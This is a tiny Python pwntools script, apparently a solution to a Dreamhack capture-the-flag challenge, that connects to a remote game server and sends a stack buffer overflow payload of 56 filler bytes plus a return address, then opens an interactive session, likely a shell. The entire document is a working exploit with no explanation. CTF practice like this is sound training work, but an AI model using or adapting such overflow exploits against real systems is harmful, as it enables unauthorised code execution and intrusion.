from pwn import * 

ncp = remote('host3.dreamhack.games', 9397)
payload = 'A' * 56 + '\xAA\x06\x40\x00\x00\x00\x00\x00'

ncp.sendafter('Input: ', payload) 
ncp.interactive()